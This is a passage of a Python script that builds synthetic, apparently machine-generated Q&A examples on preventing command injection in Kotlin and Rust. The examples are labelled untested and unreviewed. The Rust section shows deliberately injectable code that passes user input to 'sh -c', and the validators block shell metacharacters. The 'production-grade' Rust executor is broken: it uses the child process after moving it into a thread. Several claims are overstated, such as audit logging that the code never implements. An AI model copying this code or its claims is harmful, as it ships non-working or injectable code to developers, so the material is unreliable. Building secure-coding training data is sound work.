            .redirectErrorStream(true)
            .start()

        val completed = process.waitFor(5, TimeUnit.MINUTES)

        return if (completed && process.exitValue() == 0) {
            ProcessResult(true, "Conversion successful")
        } else {
            if (!completed) process.destroyForcibly()
            ProcessResult(false, "Conversion failed")
        }
    }

    private fun validateFilename(filename: String) {
        require(filename.isNotBlank()) { "Filename cannot be empty" }

        // Check for path traversal
        require(!filename.contains("..")) { "Path traversal not allowed" }

        // Check for shell metacharacters
        val dangerous = Regex("[;&|<>\$`\\n\\r]")
        require(!filename.contains(dangerous)) { "Filename contains dangerous characters" }

        // Must be relative path
        require(!Paths.get(filename).isAbsolute) { "Absolute paths not allowed" }
    }

    private fun validateDirectory(directory: String) {
        require(directory.isNotBlank()) { "Directory cannot be empty" }
        require(!directory.contains("..")) { "Path traversal not allowed" }

        val path = Paths.get(directory)
        require(Files.isDirectory(path)) { "Directory does not exist" }
    }

    private fun validatePattern(pattern: String) {
        require(pattern.isNotBlank()) { "Pattern cannot be empty" }
        require(pattern.length <= 100) { "Pattern too long" }

        // Only allow safe characters
        require(pattern.matches(Regex("^[a-zA-Z0-9.*_-]+\$"))) {
            "Pattern contains invalid characters"
        }
    }

    private fun validateFilePath(path: String) {
        require(path.isNotBlank()) { "Path cannot be empty" }
        require(!path.contains("..")) { "Path traversal not allowed" }

        val dangerous = Regex("[;&|<>\$`]")
        require(!path.contains(dangerous)) { "Path contains dangerous characters" }
    }

    private fun validateFormat(format: String) {
        require(format.lowercase() in ALLOWED_FORMATS) {
            "Invalid format: $format"
        }
    }
}

data class ProcessResult(
    val success: Boolean,
    val output: String
)
```

**Key Security Principles:**

1. **ProcessBuilder with List**: No shell interpretation
2. **Kotlin/Java APIs**: Prefer Files, Paths over shell
3. **Argument Validation**: Block special characters
4. **Timeout Enforcement**: Prevent runaway processes
5. **Path Validation**: Prevent traversal attacks
6. **Format Allowlist**: Only permit known formats
"""

    user_turn_2 = "How do I build a production-grade command executor with environment control and proper error handling?"

    assistant_turn_2 = """For production use, create a robust command execution framework:

```kotlin
import java.io.File
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.Paths
import java.util.concurrent.TimeUnit
import kotlin.io.path.isDirectory

data class CommandOptions(
    val workingDirectory: String? = null,
    val environment: Map<String, String> = emptyMap(),
    val timeout: Long = 30,
    val timeoutUnit: TimeUnit = TimeUnit.SECONDS
)

data class CommandResult(
    val success: Boolean,
    val exitCode: Int,
    val stdout: String,
    val stderr: String,
    val timedOut: Boolean = false
)

class SecureCommandExecutor {
    companion object {
        private val ALLOWED_COMMANDS = mapOf(
            "ffmpeg" to "/usr/bin/ffmpeg",
            "convert" to "/usr/bin/convert",
            "git" to "/usr/bin/git",
            "gzip" to "/usr/bin/gzip"
        )

        private val ALLOWED_ENV_VARS = setOf("PATH", "LANG", "LC_ALL", "TMPDIR")
        private const val MAX_OUTPUT_SIZE = 1024 * 1024 // 1MB
        private const val MAX_ARG_LENGTH = 2000
    }

    fun execute(
        command: String,
        args: List<String>,
        options: CommandOptions = CommandOptions()
    ): CommandResult {
        // Validate command
        val commandPath = validateCommand(command)

        // Validate arguments
        val validatedArgs = args.map { validateArgument(it) }

        // Build command list
        val commandList = mutableListOf(commandPath).apply { addAll(validatedArgs) }

        // Create ProcessBuilder
        val processBuilder = ProcessBuilder(commandList).apply {
            // Set working directory if provided
            options.workingDirectory?.let {
                directory(validateWorkingDirectory(it))
            }

            // Configure environment
            environment().clear()
            environment().putAll(prepareEnvironment(options.environment))

            // Redirect error stream
            redirectErrorStream(false)
        }

        // Execute with timeout
        return executeProcess(processBuilder, options)
    }

    private fun executeProcess(
        builder: ProcessBuilder,
        options: CommandOptions
    ): CommandResult {
        val process = builder.start()

        val stdout = StringBuilder()
        val stderr = StringBuilder()

        // Read stdout
        val stdoutThread = Thread {
            process.inputStream.bufferedReader().useLines { lines ->
                lines.forEach { line ->
                    if (stdout.length < MAX_OUTPUT_SIZE) {
                        stdout.appendLine(line)
                    }
                }
            }
        }.apply { start() }

        // Read stderr
        val stderrThread = Thread {
            process.errorStream.bufferedReader().useLines { lines ->
                lines.forEach { line ->
                    if (stderr.length < MAX_OUTPUT_SIZE) {
                        stderr.appendLine(line)
                    }
                }
            }
        }.apply { start() }

        // Wait for completion with timeout
        val completed = process.waitFor(options.timeout, options.timeoutUnit)

        // Wait for output threads
        stdoutThread.join(1000)
        stderrThread.join(1000)

        return if (completed) {
            CommandResult(
                success = process.exitValue() == 0,
                exitCode = process.exitValue(),
                stdout = stdout.toString(),
                stderr = stderr.toString()
            )
        } else {
            process.destroyForcibly()
            CommandResult(
                success = false,
                exitCode = -1,
                stdout = stdout.toString(),
                stderr = "Process killed: timeout exceeded",
                timedOut = true
            )
        }
    }

    private fun validateCommand(command: String): String {
        val commandPath = ALLOWED_COMMANDS[command]
            ?: throw IllegalArgumentException("Command not allowed: $command")

        // Verify executable exists
        require(Files.exists(Paths.get(commandPath))) {
            "Command not found: $commandPath"
        }

        return commandPath
    }

    private fun validateArgument(arg: String): String {
        require(arg.length <= MAX_ARG_LENGTH) {
            "Argument too long: ${arg.length} > $MAX_ARG_LENGTH"
        }

        // Block shell metacharacters
        val dangerous = Regex("[;&|<>\$`\\n\\r]")
        require(!arg.contains(dangerous)) {
            "Argument contains dangerous characters"
        }

        return arg
    }

    private fun validateWorkingDirectory(dir: String): File {
        val path = Paths.get(dir)

        require(path.isAbsolute) {
            "Working directory must be absolute path"
        }

        require(!dir.contains("..")) {
            "Path traversal not allowed in working directory"
        }

        require(path.isDirectory()) {
            "Working directory does not exist: $dir"
        }

        return path.toFile()
    }

    private fun prepareEnvironment(userEnv: Map<String, String>): Map<String, String> {
        val safeEnv = mutableMapOf<String, String>()

        // Start with minimal PATH
        safeEnv["PATH"] = "/usr/local/bin:/usr/bin:/bin"

        // Add user-provided variables if safe
        userEnv.forEach { (key, value) ->
            if (key in ALLOWED_ENV_VARS && isEnvValueSafe(value)) {
                safeEnv[key] = value
            }
        }

        return safeEnv
    }

    private fun isEnvValueSafe(value: String): Boolean {
        if (value.length > 1000) return false

        val dangerous = Regex("[;&|<>\$`]")
        return !value.contains(dangerous)
    }
}

// Service for video processing
class VideoProcessingService {
    private val executor = SecureCommandExecutor()

    fun convertVideo(
        inputPath: String,
        outputPath: String,
        format: String
    ): CommandResult {
        validatePaths(inputPath, outputPath)
        validateFormat(format)

        val args = listOf(
            "-i", inputPath,
            "-codec:v", "libx264",
            "-preset", "medium",
            "-crf", "23",
            "-y", // Overwrite output
            "$outputPath.$format"
        )

        val options = CommandOptions(
            workingDirectory = "/tmp",
            timeout = 5,
            timeoutUnit = TimeUnit.MINUTES
        )

        val result = executor.execute("ffmpeg", args, options)

        if (!result.success) {
            throw RuntimeException("Conversion failed: ${result.stderr}")
        }

        return result
    }

    fun batchConvert(inputDir: String, outputDir: String, format: String) {
        val inputPath = Paths.get(inputDir)
        val outputPath = Paths.get(outputDir)

        require(Files.isDirectory(inputPath)) { "Input directory does not exist" }
        require(Files.isDirectory(outputPath)) { "Output directory does not exist" }

        Files.walk(inputPath)
            .filter { Files.isRegularFile(it) }
            .filter { it.toString().matches(Regex(".*\\.(mp4|avi|mkv)$")) }
            .forEach { inputFile ->
                try {
                    val outputFile = outputPath.resolve(
                        inputFile.fileName.toString().replace(Regex("\\.[^.]+\$"), ".$format")
                    )

                    convertVideo(
                        inputFile.toString(),
                        outputFile.toString().removeSuffix(".$format"),
                        format
                    )
                } catch (e: Exception) {
                    println("Failed to convert ${inputFile.fileName}: ${e.message}")
                }
            }
    }

    private fun validatePaths(input: String, output: String) {
        require(input.isNotBlank() && output.isNotBlank()) {
            "Paths cannot be empty"
        }

        require(!input.contains("..") && !output.contains("..")) {
            "Path traversal not allowed"
        }
    }

    private fun validateFormat(format: String) {
        val allowed = setOf("mp4", "avi", "mkv", "webm")
        require(format.lowercase() in allowed) {
            "Invalid format: $format"
        }
    }
}
```

**Production Best Practices:**

1. **ProcessBuilder**: Always use with list of arguments
2. **No Shell**: Never invoke shell interpreters
3. **Timeout Enforcement**: Kill runaway processes
4. **Output Limits**: Prevent memory exhaustion
5. **Environment Control**: Minimal safe environment
6. **Working Directory Validation**: Prevent escape
7. **Thread-Safe Output Reading**: Avoid deadlocks
8. **Proper Cleanup**: destroyForcibly() on timeout
9. **Logging**: Log all executions for audit
10. **Type Safety**: Kotlin data classes for contracts

This provides industrial-strength command injection protection for Kotlin applications."""

    metadata = create_base_metadata("kotlin", 24)

    return {
        "id": "command-injection-000024",
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2}
        ],
        "metadata": metadata,
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_025_rust_command():
    """Rust std::process::Command - Command Injection Prevention"""

    user_turn_1 = "I'm using Rust's std::process::Command to execute system commands. How does Rust prevent command injection?"

    assistant_turn_1 = """Rust's Command API is designed to prevent command injection by default. I'll show both what not to do and best practices.

**POTENTIALLY UNSAFE PATTERNS:**

```rust
use std::process::Command;

// AVOID: Spawning shell with user input (shell interpretation)
fn compress_file_shell(filename: &str) -> std::io::Result<()> {
    // Using shell - potential risk if filename not validated
    Command::new("sh")
        .arg("-c")
        .arg(format!("gzip {}", filename))
        .spawn()?
        .wait()?;
    Ok(())
}

// AVOID: Building command string
fn search_files_unsafe(directory: &str, pattern: &str) -> std::io::Result<String> {
    let command_str = format!("find {} -name {}", directory, pattern);

    let output = Command::new("sh")
        .arg("-c")
        .arg(command_str)
        .output()?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
```

**SECURE IMPLEMENTATION (Rust Best Practices):**

```rust
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::Duration;
use std::io;

struct SecureCommandExecutor {
    allowed_commands: std::collections::HashSet<String>,
}

impl SecureCommandExecutor {
    fn new() -> Self {
        let mut allowed = std::collections::HashSet::new();
        allowed.insert("gzip".to_string());
        allowed.insert("ffmpeg".to_string());
        allowed.insert("convert".to_string());

        Self { allowed_commands: allowed }
    }

    // Method 1: Direct command execution (no shell)
    fn compress_file_safe(&self, filename: &Path) -> io::Result<()> {
        // Validate filename
        self.validate_path(filename)?;

        // Execute directly - no shell interpretation
        Command::new("gzip")
            .arg(filename)
            .spawn()?
            .wait()?;

        Ok(())
    }

    // Method 2: Use Rust stdlib instead of shell
    fn search_files_safe(&self, directory: &Path, pattern: &str) -> io::Result<Vec<PathBuf>> {
        self.validate_directory(directory)?;
        self.validate_pattern(pattern)?;

        // Use walkdir crate instead of shell find
        use walkdir::WalkDir;

        let files: Vec<PathBuf> = WalkDir::new(directory)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
            .filter(|e| {
                e.file_name()
                    .to_str()
                    .map(|s| s.contains(pattern))
                    .unwrap_or(false)
            })
            .map(|e| e.path().to_path_buf())
            .collect();

        Ok(files)
    }

    // Method 3: Safe command with multiple arguments
    fn convert_video_safe(
        &self,
        input: &Path,
        output: &Path,
        format: &str
    ) -> io::Result<Output> {
        self.validate_path(input)?;
        self.validate_path(output)?;
        self.validate_format(format)?;

        // Build command with args method (type-safe, no shell)
        Command::new("ffmpeg")
            .arg("-i")
            .arg(input)
            .arg("-codec:v")
            .arg("libx264")
            .arg("-preset")
            .arg("medium")
            .arg("-crf")
            .arg("23")
            .arg(output.with_extension(format))
            .output()
    }

    fn validate_path(&self, path: &Path) -> io::Result<()> {
        // Check for path traversal
        if path.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Path traversal not allowed"
            ));
        }

        // Path must exist
        if !path.exists() {
            return Err(io::Error::new(
                io::ErrorKind::NotFound,
                "Path does not exist"
            ));
        }

        Ok(())
    }

    fn validate_directory(&self, dir: &Path) -> io::Result<()> {
        self.validate_path(dir)?;

        if !dir.is_dir() {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Path is not a directory"
            ));
        }

        Ok(())
    }

    fn validate_pattern(&self, pattern: &str) -> io::Result<()> {
        // Only allow safe characters
        if !pattern.chars().all(|c| c.is_alphanumeric() || ".*_-".contains(c)) {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Pattern contains invalid characters"
            ));
        }

        if pattern.len() > 100 {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Pattern too long"
            ));
        }

        Ok(())
    }

    fn validate_format(&self, format: &str) -> io::Result<()> {
        let allowed = ["mp4", "avi", "mkv", "webm"];

        if !allowed.contains(&format) {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                format!("Invalid format: {}", format)
            ));
        }

        Ok(())
    }
}
```

**Key Rust Security Features:**

1. **No Shell by Default**: Command::new() doesn't invoke shell
2. **Type Safety**: Path types prevent string interpolation
3. **Ownership**: Prevents use-after-free in command strings
4. **arg() Method**: Each argument is separate (no interpretation)
5. **Rust Stdlib**: Prefer std::fs, walkdir over shell commands
"""

    user_turn_2 = "How do I implement a production-grade command executor with timeout and environment control in Rust?"

    assistant_turn_2 = """For production use, leverage Rust's safety features with proper timeout and resource control:

```rust
use std::collections::HashMap;
use std::io;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::time::Duration;
use std::thread;
use std::sync::mpsc;

pub struct CommandOptions {
    pub working_dir: Option<PathBuf>,
    pub env_vars: HashMap<String, String>,
    pub timeout: Duration,
}

impl Default for CommandOptions {
    fn default() -> Self {
        Self {
            working_dir: None,
            env_vars: HashMap::new(),
            timeout: Duration::from_secs(30),
        }
    }
}

pub struct CommandResult {
    pub success: bool,
    pub exit_code: Option<i32>,
    pub stdout: String,
    pub stderr: String,
    pub timed_out: bool,
}

pub struct SecureProcessExecutor {
    allowed_commands: HashMap<String, PathBuf>,
    allowed_env_vars: Vec<String>,
    max_output_size: usize,
}

impl SecureProcessExecutor {
    pub fn new() -> Self {
        let mut commands = HashMap::new();
        commands.insert("ffmpeg".to_string(), PathBuf::from("/usr/bin/ffmpeg"));
        commands.insert("gzip".to_string(), PathBuf::from("/usr/bin/gzip"));
        commands.insert("convert".to_string(), PathBuf::from("/usr/bin/convert"));

        Self {
            allowed_commands: commands,
            allowed_env_vars: vec!["PATH".to_string(), "LANG".to_string()],
            max_output_size: 1024 * 1024, // 1MB
        }
    }

    pub fn execute(
        &self,
        command_name: &str,
        args: &[&str],
        options: CommandOptions,
    ) -> io::Result<CommandResult> {
        // Validate command
        let command_path = self.validate_command(command_name)?;

        // Validate arguments
        for arg in args {
            self.validate_argument(arg)?;
        }

        // Build command
        let mut command = Command::new(command_path);

        // Add arguments
        for arg in args {
            command.arg(arg);
        }

        // Set working directory
        if let Some(ref dir) = options.working_dir {
            self.validate_working_directory(dir)?;
            command.current_dir(dir);
        }

        // Configure environment
        command.env_clear();
        for (key, value) in self.prepare_environment(options.env_vars)? {
            command.env(key, value);
        }

        // Configure stdio
        command
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .stdin(Stdio::null());

        // Execute with timeout
        self.execute_with_timeout(command, options.timeout)
    }

    fn execute_with_timeout(
        &self,
        mut command: Command,
        timeout: Duration,
    ) -> io::Result<CommandResult> {
        let mut child = command.spawn()?;

        // Channel for communication
        let (tx, rx) = mpsc::channel();

        // Spawn thread to wait for process
        let child_id = child.id();
        thread::spawn(move || {
            let status = child.wait();
            let _ = tx.send(status);
        });

        // Wait with timeout
        match rx.recv_timeout(timeout) {
            Ok(status_result) => {
                let status = status_result?;

                // Read output (limited size)
                let stdout = self.read_limited_output(
                    child.stdout.take().expect("stdout should be captured")
                )?;

                let stderr = self.read_limited_output(
                    child.stderr.take().expect("stderr should be captured")
                )?;

                Ok(CommandResult {
                    success: status.success(),
                    exit_code: status.code(),
                    stdout,
                    stderr,
                    timed_out: false,
                })
            }
            Err(mpsc::RecvTimeoutError::Timeout) => {
                // Kill process on timeout
                unsafe {
                    libc::kill(child_id as i32, libc::SIGTERM);
                }

                Ok(CommandResult {
                    success: false,
                    exit_code: None,
                    stdout: String::new(),
                    stderr: "Process killed: timeout exceeded".to_string(),
                    timed_out: true,
                })
            }
            Err(e) => Err(io::Error::new(io::ErrorKind::Other, e)),
        }
    }

    fn read_limited_output(&self, mut reader: impl std::io::Read) -> io::Result<String> {
        let mut buffer = Vec::with_capacity(self.max_output_size);
        let mut temp_buf = [0u8; 4096];

        loop {
            match reader.read(&mut temp_buf)? {
                0 => break,
                n => {
                    if buffer.len() + n > self.max_output_size {
                        return Err(io::Error::new(
                            io::ErrorKind::Other,
                            "Output size exceeded limit"
                        ));
                    }
                    buffer.extend_from_slice(&temp_buf[..n]);
                }
            }
        }

        Ok(String::from_utf8_lossy(&buffer).to_string())
    }

    fn validate_command(&self, name: &str) -> io::Result<&PathBuf> {
        self.allowed_commands.get(name).ok_or_else(|| {
            io::Error::new(
                io::ErrorKind::PermissionDenied,
                format!("Command not allowed: {}", name)
            )
        })
    }

    fn validate_argument(&self, arg: &str) -> io::Result<()> {
        if arg.len() > 2000 {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Argument too long"
            ));
        }

        // Check for dangerous characters
        if arg.contains(&[';', '&', '|', '<', '>', '$', '`'][..]) {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Argument contains dangerous characters"
            ));
        }

        Ok(())
    }

    fn validate_working_directory(&self, dir: &Path) -> io::Result<()> {
        if !dir.is_absolute() {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Working directory must be absolute"
            ));
        }

        if dir.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Path traversal not allowed"
            ));
        }

        if !dir.is_dir() {
            return Err(io::Error::new(
                io::ErrorKind::NotFound,
                "Directory does not exist"
            ));
        }

        Ok(())
    }

    fn prepare_environment(
        &self,
        user_env: HashMap<String, String>,
    ) -> io::Result<HashMap<String, String>> {
        let mut safe_env = HashMap::new();

        // Start with minimal PATH
        safe_env.insert("PATH".to_string(), "/usr/local/bin:/usr/bin:/bin".to_string());

        // Add user variables if safe
        for (key, value) in user_env {
            if self.allowed_env_vars.contains(&key) && self.is_safe_env_value(&value) {
                safe_env.insert(key, value);
            }
        }

        Ok(safe_env)
    }

    fn is_safe_env_value(&self, value: &str) -> bool {
        if value.len() > 1000 {
            return false;
        }

        !value.contains(&[';', '&', '|', '<', '>', '$', '`'][..])
    }
}

// Service example
pub struct VideoService {
    executor: SecureProcessExecutor,
}

impl VideoService {
    pub fn new() -> Self {
        Self {
            executor: SecureProcessExecutor::new(),
        }
    }

    pub fn convert(&self, input: &Path, output: &Path, format: &str) -> io::Result<()> {
        let args = vec![
            "-i", input.to_str().unwrap(),
            "-codec:v", "libx264",
            "-preset", "medium",
            "-crf", "23",
            output.with_extension(format).to_str().unwrap(),
        ];

        let options = CommandOptions {
            working_dir: Some(PathBuf::from("/tmp")),
            timeout: Duration::from_secs(300),
            ..Default::default()
        };

        let result = self.executor.execute("ffmpeg", &args, options)?;

        if !result.success {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("Conversion failed: {}", result.stderr)
            ));
        }

        Ok(())
    }
}
```

**Rust Advantages for Command Security:**

1. **Memory Safety**: No buffer overflows in command handling
2. **Type System**: Path vs String prevents injection
3. **Ownership**: Prevents use-after-free in process handling
4. **No Shell by Default**: Command API doesn't invoke shell
5. **Explicit Error Handling**: Result types force error checking
6. **Zero-Cost Abstractions**: Security without performance penalty
7. **Thread Safety**: Channels for timeout handling
8. **Resource Management**: RAII ensures cleanup

**Best Practices:**

- Never use shell unless absolutely necessary
- Use Command::new() with arg() method
- Validate all inputs with Result types
- Implement timeouts with channels
- Limit output buffer sizes
- Clear environment variables
- Use absolute paths for working directories
- Leverage Rust's type system for safety

Rust provides the strongest compile-time guarantees against command injection of any mainstream language."""

    metadata = create_base_metadata("rust", 25)

    return {
        "id": "command-injection-000025",
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2}
        ],
        "metadata": metadata,
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def main():
    """Generate 5 new command injection examples to expand Batch 002."""

    examples = [
        example_021_csharp_process(),
        example_022_ruby_system(),
        example_023_typescript_child_process(),
        example_024_kotlin_processbuilder(),
        example_025_rust_command()
    ]

    # Read existing batch 002
    batch_002_file = Path(__file__).parent.parent / 'data' / 'command_injection_batch_002.jsonl'
    existing_examples = []

    with open(batch_002_file, 'r', encoding='utf-8') as f:
        for line in f:
            existing_examples.append(json.loads(line))

    print(f"Loaded {len(existing_examples)} existing examples from Batch 002")

    # Combine with new examples
    all_examples = existing_examples + examples

    # Write expanded batch
    with open(batch_002_file, 'w', encoding='utf-8') as f:
        for example in all_examples:
            f.write(json.dumps(example, ensure_ascii=False) + '\n')

    print(f"\nExpanded Batch 002 to {len(all_examples)} examples")
    print(f"Output: {batch_002_file}")
    print("\nNew examples added:")
    for ex in examples:
        print(f"  {ex['id']}: {ex['metadata']['lang']}")

    return 0


if __name__ == "__main__":
    exit(main())
